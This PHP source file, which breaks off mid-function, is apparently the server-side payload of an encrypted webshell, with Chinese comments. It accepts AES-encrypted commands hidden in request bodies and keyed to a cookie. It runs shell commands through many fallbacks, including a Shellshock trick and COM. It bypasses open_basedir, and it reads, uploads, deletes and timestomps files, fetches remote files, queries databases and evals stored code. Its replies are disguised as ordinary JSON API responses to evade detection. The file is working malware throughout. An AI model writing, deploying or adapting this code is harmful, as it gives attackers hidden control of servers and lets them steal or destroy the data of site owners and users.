<?php

$parameters=array();

$_SES=array();
$GLOBALS['pm']='$param$';
$GLOBALS['secret_key']='$secret_key$'; 
$GLOBALS['cookie_name']='$cookie_name$';


function getCookieValue($name){
    if (isset($_COOKIE[$name])){
        return $_COOKIE[$name];
    }
    return null;
}


function generate_marker($cookie_value, $secret_key){
    $marker_string = $cookie_value . $secret_key;
    $md5_hash = md5($marker_string);
    return array(
        'left' => substr($md5_hash, 0, 16),
        'right' => substr($md5_hash, 16)
    );
}


function run(){
    global $pm, $secret_key, $cookie_name;
    
    $content_type = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
    
    $cookie_value = getCookieValue($cookie_name);
    if ($cookie_value === null){
        return;  
    }
    
    if (strpos($content_type, 'application/x-www-form-urlencoded') !== false) {
        
        if (isset($_POST[$pm])) {
            $encrypted_data_base64 = $_POST[$pm];
        } else {
            $raw_body = file_get_contents('php://input');
            parse_str($raw_body, $post_data);
            if (isset($post_data[$pm])) {
                $encrypted_data_base64 = $post_data[$pm];
            } else {
                return;  
            }
        }
        
        $pms = aesDecrypt(base64DecodeNoPadding($encrypted_data_base64), $secret_key);
        
        if ($pms === false) {
            return;  
        }
        
    } else {
        
        $request_marker = generate_marker($cookie_value . "mark", $secret_key);
        $left_marker_hex = $request_marker['left'];
        $right_marker_hex = $request_marker['right'];
        $left_marker_base64 = rtrim(base64_encode(hex2bin($left_marker_hex)), '=');
        $right_marker_base64 = rtrim(base64_encode(hex2bin($right_marker_hex)), '=');
        
        $raw_body = file_get_contents('php://input');
        
        $left_pos = strpos($raw_body, $left_marker_base64);
        $right_pos = strrpos($raw_body, $right_marker_base64);
        $left_len = strlen($left_marker_base64);

        if ($left_pos === false || $right_pos === false) {
            $left_pos = strpos($raw_body, $left_marker_hex);
            $right_pos = strrpos($raw_body, $right_marker_hex);
            $left_len = strlen($left_marker_hex);
        }
        
        if ($left_pos === false || $right_pos === false || $left_pos >= $right_pos){
            return;  // 标记不存在或位置错误，直接返回
        }
        
        // 提取被标记包裹的加密数据（Base64编码）
        $encrypted_data_base64 = substr($raw_body, $left_pos + $left_len, $right_pos - $left_pos - $left_len);
        
        // Base64解码后进行AES解密
        $pms = aesDecrypt(base64DecodeNoPadding($encrypted_data_base64), $secret_key);
        
        if ($pms === false) {
            return;  // AES解密失败，直接返回
        }
    }
    
    reDefSystemFunc();
    $_SES=&getSession();
    @session_start();
    $sessioId=md5(session_id());
    if (isset($_SESSION[$sessioId])){
        $session_data = aesDecrypt(base64Decode($_SESSION[$sessioId]), $sessioId);
        if ($session_data !== false) {
            $_SES=unserialize($session_data);
        }
    }
    @session_write_close();

    if (canCallGzipDecode()==1&&@isGzipStream($pms)){
        $pms=gzdecode($pms);
    }
    formatParameter($pms);

    if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    $result=evalFunc();

    if ($_SES!==null){
        session_start();
        $session_encrypted = aesEncrypt(serialize($_SES), $sessioId);
        if ($session_encrypted !== false) {
            $_SESSION[$sessioId]=base64_encode($session_encrypted);
        }
        @session_write_close();
    }

    if (canCallGzipEncode()){
        $result=gzencode($result,6);
    }
    
    // 加密结果（使用AES加密）
    $result=aesEncrypt($result,$secret_key);
    
    if ($result === false) {
        return;  // AES加密失败，直接返回
    }
    
    // 生成响应的左右标记（使用 cookie_value）
    $response_marker = generate_marker($cookie_value, $secret_key);
    
    // Base64编码加密数据并移除填充符
    $encrypted_base64 = base64_encode($result);
    $encrypted_base64 = rtrim($encrypted_base64, '=');  // 移除末尾的等号
    
    // 将左右标记转换为二进制，然后Base64编码（增强隐蔽性）
    $left_marker_binary = hex2bin($response_marker['left']);
    $right_marker_binary = hex2bin($response_marker['right']);
    $left_marker_base64 = rtrim(base64_encode($left_marker_binary), '=');  // 移除等号
    $right_marker_base64 = rtrim(base64_encode($right_marker_binary), '=');  // 移除等号
    
    // 输出带标记的响应（全部为Base64格式，无等号特征）
    $encrypted_data = $left_marker_base64 . $encrypted_base64 . $right_marker_base64;

    // 伪装成JSON响应（看起来像普通的API接口）
    header('Content-Type: application/json');
    
    // 构造JSON对象，包含一些伪装字段
    $response_json = array(
        'status' => 'success',
        'code' => 200,
        'timestamp' => time(),
        'data' => $encrypted_data,  // 加密数据放在data字段中（客户端会自动识别任意字段名）
        'message' => 'Request processed successfully'
    );
    
    // 输出JSON格式的响应
    echo json_encode($response_json);
    
    return $result;
}
/**
 * 使用AES加密数据
 * @param string $data 要加密的数据
 * @param string $key 密钥（16字节）
 * @return string|false 加密后的数据，失败返回false
 */
function aesEncrypt($data, $key){
    // 检查OpenSSL函数是否可用
    if (!function_existsEx('openssl_encrypt')) {
        return false;
    }
    
    // 使用AES-128-ECB模式，PKCS7填充
    $encrypted = openssl_encrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
    return $encrypted;
}

/**
 * 使用AES解密数据
 * @param string $data 要解密的数据
 * @param string $key 密钥（16字节）
 * @return string|false 解密后的数据，失败返回false
 */
function aesDecrypt($data, $key){
    // 检查OpenSSL函数是否可用
    if (!function_existsEx('openssl_decrypt')) {
        return false;
    }
    
    // 使用AES-128-ECB模式，PKCS7填充
    $decrypted = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
    return $decrypted;
}
/**
 * 如果核心函数不存在，则重新定义它们，以增强兼容性。
 */
function reDefSystemFunc(){
    if (!function_exists("file_get_contents")) {
        function file_get_contents($file) {
            $f = @fopen($file,"rb");
            $contents = false;
            if ($f) {
                do { $contents .= fgets($f); } while (!feof($f));
            }
            fclose($f);
            return $contents;
        }
    }
    if (!function_exists('gzdecode')&&function_existsEx("gzinflate")) {
        function gzdecode($data)
        {
            return gzinflate(substr($data,10,-8));
        }
    }
}
/**
 * 获取全局会话数组的引用。
 * @return array 全局会话数组的引用。
 */
function &getSession(){
    global $_SES;
    return $_SES;
}
/**
 * 尝试绕过PHP的 `open_basedir` 限制。
 * 这是一种已知的技术，通过创建目录、改变当前目录到根目录，然后重置 `open_basedir` 配置。
 */
function bypass_open_basedir(){
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    $allFiles = @scandir($_FILENAME);
    $cdStatus=false;
    if ($allFiles!=null){
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                if (@is_dir($fileName)){
                    if (@chdir($fileName)===true){
                        $cdStatus=true;
                        break;
                    }
                }
            }

        }
    }
    if(!@file_exists('bypass_open_basedir')&&!$cdStatus){
        @mkdir('bypass_open_basedir');
    }
    if (!$cdStatus){
        @chdir('bypass_open_basedir');
    }
    @ini_set('open_basedir','..');
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_path = str_replace("\\",'/',$_FILENAME);
    @$_num = substr_count($_path,'/') + 1;
    $_i = 0;
    while($_i < $_num){
        @chdir('..');
        $_i++;
    }
    @ini_set('open_basedir','/');
    if (!$cdStatus){
        @rmdir($_FILENAME.'/'.'bypass_open_basedir');
    }
}
/**
 * 解析自定义格式的参数字符串。
 * @param string $pms 待解析的参数字符串。
 */
function formatParameter($pms){
    global $parameters;
    $index=0;
    $key=null;
    while (true){
        $q=$pms[$index];
        if (ord($q)==0x02){
            $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]=$value;
            $key=null;
        }else{
            $key.=$q;
        }
        $index++;
        if ($index>strlen($pms)-1){
            break;
        }
    }
}
/**
 * 核心功能调度函数。根据传入的参数执行相应的代码或函数。
 * @return mixed 函数执行结果。
 */
function evalFunc(){
    try{
        @session_write_close();
        $className=get("codeName");
        $methodName=get("methodName");
        $_SES=&getSession();
        if ($methodName!=null){
            if (strlen(trim($className))>0){
                if ($methodName=="includeCode"){
                    return includeCode();
                }else{
                    if (isset($_SES[$className])){
                        return eval($_SES[$className]);
                    }else{
                        return "{$className} no load";
                    }
                }
            }else{
                if (function_exists($methodName)){
                    return $methodName();
                }else{
                    return "function {$methodName} not exist";
                }
            }
        }else{
            return "methodName Is Null";
        }
    }catch (Exception $e){
        return "ERROR://".$e -> getMessage();
    }

}
/**
 * 递归删除目录。
 * @param string $p 要删除的目录路径。
 * @return bool 成功返回true，失败返回false。
 */
function deleteDir($p){
    $m=@dir($p);
    while(@$f=$m->read()){
        $pf=$p."/".$f;
        @chmod($pf,0777);
        if((is_dir($pf))&&($f!=".")&&($f!="..")){
            deleteDir($pf);
            @rmdir($pf);
        }else if (is_file($pf)&&($f!=".")&&($f!="..")){
            @unlink($pf);
        }
    }
    $m->close();
    @chmod($p,0777);
    return @rmdir($p);
}
/**
 * 删除文件或目录。
 * @return string "ok" 或 "fail"。
 */
function deleteFile(){
    $F=get("fileName");
    if(is_dir($F)){
        return deleteDir($F)?"ok":"fail";
    }else{
        return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
    }
}
/**
 * 设置文件属性（权限或时间戳）。
 * @return string "ok" 或 "fail" 或错误信息。
 */
function setFileAttr(){
    $type = get("type");
    $attr = get("attr");
    $fileName = get("fileName");
    $ret = "Null";
    if ($type!=null&&$attr!=null&&$fileName!=null) {
        if ($type=="fileBasicAttr"){
            if (@chmod($fileName,convertFilePermissions($attr))){
                return "ok";
            }else{
                return "fail";
            }
        }else if ($type=="fileTimeAttr"){
            // 解析时间属性：格式为 "mtime|atime"，支持 "none" 表示不修改
            $timeArray = explode("|", $attr);
            
            // 确保有两个元素
            if (count($timeArray) < 2) {
                return "fail: time format error, expected 'mtime|atime'";
            }
            
            // 获取文件当前的时间信息（用于处理 "none" 的情况）
            $currentMtime = @filemtime($fileName);
            $currentAtime = @fileatime($fileName);
            
            // 处理修改时间
            if (strtolower(trim($timeArray[0])) === "none") {
                $mtime = $currentMtime !== false ? $currentMtime : time();
            } else {
                $mtime = intval($timeArray[0]);
            }
            
            // 处理访问时间
            if (strtolower(trim($timeArray[1])) === "none") {
                $atime = $currentAtime !== false ? $currentAtime : time();
            } else {
                $atime = intval($timeArray[1]);
            }
            
            // 设置文件时间
            if (@touch($fileName, $mtime, $atime)){
                return "ok";
            }else{
                return "fail";
            }
        }else{
            return "no ExcuteType";
        }
    }else{
        $ret="type or attr or fileName is null";
    }
    return $ret;
}
/**
 * 从远程URL下载文件并保存到本地。
 * @return string "ok" 或 "fail" 或错误信息。
 */
function fileRemoteDown(){
    $url=get("url");
    $saveFile=get("saveFile");
    if ($url!=null&&$saveFile!=null) {
        $data=@file_get_contents($url);
        if ($data!==false){
            if (@file_put_contents($saveFile,$data)!==false){
                @chmod($saveFile,0777);
                return "ok";
            }else{
                return "write fail";
            }
        }else{
            return "read fail";
        }
    }else{
        return "url or saveFile is null";
    }
}
/**
 * 复制文件。
 * @return string "ok" 或 "fail" 或错误信息。
 */
function copyFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (@is_file($srcFileName)){
        if (copy($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    }else{
        return "The target does not exist or is not a file";
    }
}
/**
 * 移动或重命名文件。
 * @return string "ok" 或 "fail"。
 */
function moveFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (rename($srcFileName,$destFileName)){
        return "ok";
    }else{
        return "fail";
    }

}
/**
 * 获取服务器基础信息。
 * @return string 格式化后的服务器信息字符串。
 */
function getBasicsInfo()
{
    $data = array();
    $data['OsInfo'] = @php_uname();
    $data['CurrentUser'] = @get_current_user();
    $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
    $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR'];
    $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT'];
    $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP'];
    $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR'];
    $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['disable_functions'] = @ini_get('disable_functions');
    $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
    $data['Open_basedir'] = @ini_get('open_basedir');
    $data['timezone'] = @ini_get('date.timezone');
    $data['encode'] = @ini_get('exif.encode_unicode');
    $data['extension_dir'] = @ini_get('extension_dir');
    $data['sys_get_temp_dir'] = @sys_get_temp_dir();
    $data['include_path'] = @ini_get('include_path');
    $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];
    $data['PHP_SAPI'] = PHP_SAPI;
    $data['PHP_VERSION'] = PHP_VERSION;
    $data['PHP_INT_SIZE'] = PHP_INT_SIZE;
    $data['canCallGzipDecode'] = canCallGzipDecode();
    $data['canCallGzipEncode'] = canCallGzipEncode();
    $data['session_name'] = @ini_get("session.name");
    $data['session_save_path'] = @ini_get("session.save_path");
    $data['session_save_handler'] = @ini_get("session.save_handler");
    $data['session_serialize_handler'] = @ini_get("session.serialize_handler");
    $data['user_ini_filename'] = @ini_get("user_ini.filename");
    $data['memory_limit'] = @ini_get('memory_limit');
    $data['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $data['post_max_size'] = @ini_get('post_max_size');
    $data['max_execution_time'] = @ini_get('max_execution_time');
    $data['max_input_time'] = @ini_get('max_input_time');
    $data['default_socket_timeout'] = @ini_get('default_socket_timeout');
    $data['mygid'] = @getmygid();
    $data['mypid'] = @getmypid();
    $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
    $data['short_open_tag'] = @get_cfg_var('short_open_tag');
    $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
    $data['asp_tags'] = @get_cfg_var('asp_tags');
    $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
    $data['safe_mode'] = @get_cfg_var('safe_mode');
    $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
    $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
    $SCRIPT_FILENAME=@dirname($_SERVER['SCRIPT_FILENAME']);
    $data['FileRoot'] = '';
    if (substr($SCRIPT_FILENAME, 0, 1) != '/') {foreach (range('A', 'Z') as $L){ if (@is_dir("{$L}:")){ $data['FileRoot'] .= "{$L}:/;";}};};
    $data['FileRoot'] = (strlen(trim($data['FileRoot'])) > 0 ? $data['FileRoot'] : '/');
    $data['FileRoot']= substr_count($data['FileRoot'],substr($SCRIPT_FILENAME, 0, 1))<=0?substr($SCRIPT_FILENAME, 0, 1).":/":$data['FileRoot'];
    $result="";
    foreach($data as $key=>$value){
        $result.=$key." : ".$value."\n";
    }
    return $result;
}
/**
 * 获取指定目录下的文件和文件夹列表。
 * @return string 格式化的文件列表或错误信息。
 */
function getFile(){
    $dir=get('dirName');
    $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
    $dir.="/";
    $path=$dir;
    $allFiles = @scandir($path);
    $data="";
    if ($allFiles!=null){
        $data.="ok";
        $data.="\n";
        $data.=$path;
        $data.="\n";
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                $fullPath = $path.$fileName;
                $lineData=array();
                array_push($lineData,$fileName);
                array_push($lineData,@is_file($fullPath)?"1":"0");
                array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath)));
                array_push($lineData,@filesize($fullPath));
                $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                array_push($lineData,(strlen($fr)>0?$fr:"F"));
                $data.=(implode("\t",$lineData)."\n");
            }

        }
    }else{
        return "Path Not Found Or No Permission!";
    }
    return $data;
}
/**
 * 读取文件内容。
 * @return string 文件内容或错误信息。
 */
function readFileContent(){
    $fileName=get("fileName");
    if (@is_file($fileName)){
        if (@is_readable($fileName)){
            return file_get_contents($fileName);
        }else{
            return "No Permission!";
        }
    }else{
        return "File Not Found";
    }
}
/**
 * 上传文件。
 * @return string "ok" 或 "fail"。
 */
function uploadFile(){
    $fileName=get("fileName");
    $fileValue=get("fileValue");
    if (@file_put_contents($fileName,$fileValue)!==false){
        @chmod($fileName,0777);
        return "ok";
    }else{
        return "fail";
    }
}
/**
 * 创建新目录。
 * @return string "ok" 或 "fail"。
 */
function newDir(){
    $dir=get("dirName");
    if (@mkdir($dir,0777,true)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
/**
 * 创建新文件。
 * @return string "ok" 或 "fail"。
 */
function newFile(){
    $fileName=get("fileName");
    if (@file_put_contents($fileName,"")!==false){
        return "ok";
    }else{
        return "fail";
    }
}

/**
 * 检查函数是否存在且未被`disable_functions`禁用。
 * @param string $functionName 要检查的函数名。
 * @return bool 如果函数可用则返回true，否则返回false。
 */
function function_existsEx($functionName){
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d));
}

/**
 * 执行系统命令。
 * 尝试使用多种PHP函数（system, passthru, shell_exec等）来执行命令，以绕过安全限制。
 * @return string 命令执行的输出。
 */
function execCommand(){
    @ob_start();
    $cmdLine=get("cmdLine");
    $d=__FILE__;
    $cmdLine=substr($d,0,1)=="/"?"-c \"{$cmdLine}\"":"/c \"{$cmdLine}\"";
    if(substr($d,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $executeFile=substr($d,0,1)=="/"?"sh":"cmd";

    $cmdLine="{$executeFile} {$cmdLine}";
    $cmdLine=$cmdLine." 2>&1";
    $ret=0;

    if (!function_exists("runshellshock")){
        function runshellshock($d, $c) {
            if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $tmp = tempnam(sys_get_temp_dir(), 'as');
                    putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                    if (function_existsEx('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    print($output);
                    return True;
                }
            }
            return False;
        };
    }

    if(function_existsEx('system')){
        @system($cmdLine,$ret);
    }elseif(function_existsEx('passthru')){
        @passthru($cmdLine,$ret);
    }elseif(function_existsEx('shell_exec')){
        print(@shell_exec($cmdLine));
    }elseif(function_existsEx('exec')){
        @exec($cmdLine,$o,$ret);
        print(join("\n",$o));
    }elseif(function_existsEx('popen')){
        $fp=@popen($cmdLine,'r');
        while(!@feof($fp)){
            print(@fgets($fp,2048));
        }
        @pclose($fp);
    }elseif(function_existsEx('proc_open')){
        $p = @proc_open($cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while(!@feof($io[1])){
            print(@fgets($io[1],2048));
        }
        while(!@feof($io[2])){
            print(@fgets($io[2],2048));
        }
        @fclose($io[1]);
        @fclose($io[2]);
        @proc_close($p);
    }elseif(runshellshock($d, $cmdLine)) {
        print($ret);
    }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
        $w=new COM('WScript.shell');
        $e=$w->exec($cmdLine);
        $so=$e->StdOut();
        print($so->ReadAll());
        $se=$e->StdErr();
        print($se->ReadAll());
    }else{
        return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock is available";
    }
    print(($ret!=0)?"ret={$ret}":"");
    $result = @ob_get_contents();
    @ob_end_clean();
    return $result;
}
/**
 * 执行SQL查询。
 * @return string 查询结果或错误信息。
 */
function execSql(){
    $dbType=get("dbType");
    $dbHost=get("dbHost");
    $dbPort=get("dbPort");
    $username=get("dbUsername");
    $password=get("dbPassword");
    $execType=get("execType");
    $execSql=get("execSql");
    function  mysql_exec($host,$port,$username,$password,$execType,$sql){
        // 创建连接
        $conn = new mysqli($host,$username,$password,"",$port);
        // Check connection
        if ($conn->connect_error) {
            return $conn->connect_error;
        }

        $result = $conn->query($sql);
        if ($conn->error){
            return $conn->error;
        }
        $result = $conn->query($sql);
        if ($execType=="update"){
            return "Query OK, "+$conn->affected_rows+" rows affected";
        }else{
            $data="ok\n";
            while ($column = $result->fetch_field()){
                $data.=base64_encode($column->name)."\t";
            }
            $data.="\n";
            if ($result->num_rows > 0) {
                // 输出数据
                while($row = $result->fetch_assoc()) {
                    foreach ($row as $value){
                        $data.=base64_encode($value)."\t";
                    }
                    $data.="\n";
                }
            }
            return $data;
        }
    }

    function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql){
        try {
            $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password);

            // 设置 PDO 错误模式为异常
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if ($execType=="update"){
                return "Query OK, "+$conn->exec($sql)+" rows affected";
            }else{
                $data="ok\n";
                $stm=$conn->prepare($sql);
                $stm->execute();
                $row=$stm->fetch(PDO::FETCH_ASSOC);
                $_row="\n";
                foreach (array_keys($row) as $key){
                    $data.=base64_encode($key)."\t";
                    $_row.=base64_encode($row[$key])."\t";
                }
                $data.=$_row."\n";
                while ($row=$stm->fetch(PDO::FETCH_ASSOC)){
                    foreach (array_keys($row) as $key){
                        $data.=base64_encode($row[$key])."\t";
                    }
                    $data.="\n";
                }
                return $data;
            }

        }
        catch(PDOException $e)
        {
            return $e->getMessage();
        }
    }
    if ($dbType=="mysql"){
        if (extension_loaded("mysqli")){
            return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else if (extension_loaded("pdo")){
            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else{
            return "no extension";
        }
    }else if (extension_loaded("pdo")){
        return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
    }else{
        return "no extension";
    }
    return "no extension";

}


function testConnection(){
    $dbType = get("dbType");
    $dbHost = get("dbHost");
    $dbPort = get("dbPort");
    $username = get("dbUsername");
    $password = get("dbPassword");
    
    // 参数验证
    if ($dbType == null || $dbHost == null || $dbPort == null || $username == null || $password == null) {
        return "error: missing database parameters";
    }
    
    // 测试 MySQL 连接（使用 mysqli）
    function test_mysql_connection($host, $port, $username, $password) {
        try {
            
            $conn = @new mysqli($host, $username, $password, "", $port);
            
            if ($conn->connect_error) {
                return "error: " . $conn->connect_error;
            }
            
            // 获取数据库版本信息
            $version = $conn->server_info;
            $conn->close();
            
            return "ok: MySQL connection successful, Server version: " . $version;
        } catch (Exception $e) {
            return "error: " . $e->getMessage();
        }
    }
    
    // 测试 PDO 连接（通用）
    function test_pdo_connection($databaseType, $host, $port, $username, $password) {
        try {
            
            $dsn = "{$databaseType}:host={$host};port={$port}";
            $conn = new PDO($dsn, $username, $password);
            
            // 设置 PDO 错误模式为异常
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            // 获取数据库版本信息
            $version = $conn->getAttribute(PDO::ATTR_SERVER_VERSION);
            $conn = null;
            
            return "ok: " . strtoupper($databaseType) . " connection successful, Server version: " . $version;
        } catch (PDOException $e) {
            return "error: " . $e->getMessage();
        }
    }
    
    // 根据数据库类型选择连接方式
    if ($dbType == "mysql") {
        // MySQL 优先使用 mysqli
        if (extension_loaded("mysqli")) {
            return test_mysql_connection($dbHost, $dbPort, $username, $password);
        } else if (extension_loaded("pdo_mysql")) {
            return test_pdo_connection("mysql", $dbHost, $dbPort, $username, $password);
        } else {
            return "error: no mysql extension available (mysqli or pdo_mysql required)";
        }
    } else {
        // 其他数据库类型使用 PDO
        $pdo_extension = "pdo_" . $dbType;
        if (extension_loaded($pdo_extension)) {
            return test_pdo_connection($dbType, $dbHost, $dbPort, $username, $password);
        } else {
            return "error: PDO extension for {$dbType} not loaded ({$pdo_extension} required)";
        }
    }
}


/**
 * 对数据进行Base64编码。
 * @param string $data 要编码的数据。
 * @return string 编码后的字符串。
 */
function base64Encode($data){
    return base64_encode($data);
}
/**
 * 测试函数，用于检查payload是否正常工作。
 * @return string "ok"。
 */
function test(){
    return "ok";
}
/**
 * 从全局参数数组中获取一个参数值。
 * @param string $key 参数的键名。
 * @return mixed|null 参数值，如果不存在则返回null。
 */
function get($key){
    global $parameters;
    if (isset($parameters[$key])){
        return $parameters[$key];
    }else{
        return null;
    }
}
/**
 * 获取所有解析后的参数。
 * @return array 包含所有参数的数组。
 */
function getAllParameters(){
    global $parameters;
    return $parameters;
}
/**
 * 将PHP代码加载到会话中，以便后续通过evalFunc执行。
 * @return string "ok"。
 */
function includeCode(){
    $classCode=get("binCode");
    $codeName=get("codeName");
    $_SES=&getSession();
    $_SES[$codeName]=$classCode;
    return "ok";
}
/**
 * 对Base64编码的字符串进行解码。
 * @param string $string 要解码的字符串。
 * @return string 解码后的数据。
 */
function base64Decode($string){
    return base64_decode($string);
}

function base64DecodeNoPadding($string){
    $remainder = strlen($string) % 4;
    if ($remainder) {
        $string .= str_repeat('=', 4 - $remainder);
    }
    return base64_decode($string);
}
/**
 * 将字符串格式的文件权限（如 'RWX'）转换为八进制数值。
 * @param string $fileAttr 字符串格式的权限。
 * @return int 八进制的权限值。
 */
function convertFilePermissions($fileAttr){
    $mod=0;
    if (strpos($fileAttr,'R')!==false){
        $mod=$mod+0444;
    }
    if (strpos($fileAttr,'W')!==false){
        $mod=$mod+0222;
    }
    if (strpos($fileAttr,'X')!==false){
        $mod=$mod+0111;
    }
    return $mod;
}
/**
 * 关闭并销毁会话，实现“注销”功能。
 * @return string "ok" 或 "fail!"。
 */
function close(){
    @session_start();
    $_SES=&getSession();
    $_SES=null;
    if (@session_destroy()){
        return "ok";
    }else{
        return "fail!";
    }
}

/**
 * 大文件下载功能。
 * 可以获取文件大小或读取文件指定位置和长度的数据块。
 * @return string 文件大小或文件块数据或错误信息。
 */
function bigFileDownload(){
    $mode=get("mode");
    $fileName=get("fileName");
    $readByteNum=get("readByteNum");
    $position=get("position");
    if ($mode=="fileSize"){
        if (@is_readable($fileName)){
            return @filesize($fileName)."";
        }else{
            return "not read";
        }
    }elseif ($mode=="read"){

        if (function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){
            $handle=fopen($fileName,"ab+");
            fseek($handle,$position);
            $data=fread($handle,$readByteNum);
            @fclose($handle);
            if ($data!==false){
                return $data;
            }else{
                return "cannot read file";
            }
        }else if (function_existsEx("file_get_contents")){
            return file_get_contents($fileName,false,null,$position,$readByteNum);
        }else{
            return "no function";
        }

    }else{
        return "no mode";
    }
}

/**
 * 大文件上传功能。
 * 将数据块写入文件的指定位置。
 * @return string "ok" 或错误信息。
 */
function bigFileUpload(){
    $fileName = get("fileName");
    $fileContents = get("fileContents");
    $position = get("position");
    
    if ($fileName == null || $fileContents == null || $position == null) {
        return "fileName, fileContents or position is null";
    }
    
    // 转换位置为整数
    $position = intval($position);
    
    if (function_existsEx("fopen") && function_existsEx("fwrite") && function_existsEx("fseek")) {
        // 如果文件不存在，创建它；否则以读写模式打开
        $mode = file_exists($fileName) ? "r+b" : "w+b";
        $handle = @fopen($fileName, $mode);
        
        if ($handle === false) {
            return "cannot open file";
        }
        
        // 定位到指定位置
        if (@fseek($handle, $position) !== 0) {
            @fclose($handle);
            return "cannot seek to position";
        }
        
        // 写入数据
        $len = @fwrite($handle, $fileContents);
        @fclose($handle);
        
        if ($len === false) {
            return "cannot write file";
        }
        
        return "ok";
    } else if (function_existsEx("file_put_contents")) {
        // file_put_contents 只支持追加模式，不支持指定位置写入
        // 如果 position 为 0，使用覆盖模式；否则返回错误
        if ($position == 0) {
            if (@file_put_contents($fileName, $fileContents) !== false) {
                return "ok";
            } else {
                return "write fail";
            }
        } else {
            return "file_put_contents does not support position write";
        }
    } else {
        return "no available function";
    }
}

/**
 * 检查gzencode函数是否可用。
 * @return string "1" 表示可用，"0" 表示不可用。
 */
function canCallGzipEncode(){
    if (function_existsEx("gzencode")){
        return "1";
    }else{
        return "0";
    }
}
/**
 * 检查gzdecode函数是否可用。
 * @return string "1" 表示可用，"0" 表示不可用。
 */
function canCallGzipDecode(){
    if (function_existsEx("gzdecode")){
        return "1";
    }else{
        return "0";
    }
}
/**
 * 将字节数组的指定位置转换为整数（小端序）。
 * @param array $bytes 字节数组。
 * @param int $position 起始位置。
 * @return int 转换后的整数。
 */
function bytesToInteger($bytes, $position) {
    $val = 0;
    $val = $bytes[$position + 3] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 2] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 1] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position] & 0xff;
    return $val;
}
/**
 * 检查二进制数据流是否为Gzip格式。
 * @param string $bin 二进制数据。
 * @return bool 如果是Gzip流则返回true，否则返回false。
 */
function isGzipStream($bin){
    if (strlen($bin)>=2){
        $bin=substr($bin,0,2);
        $strInfo = @unpack("C2chars", $bin);
        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
        switch ($typeCode) {
            case 31139:
                return true;
                break;
            default:
                return false;
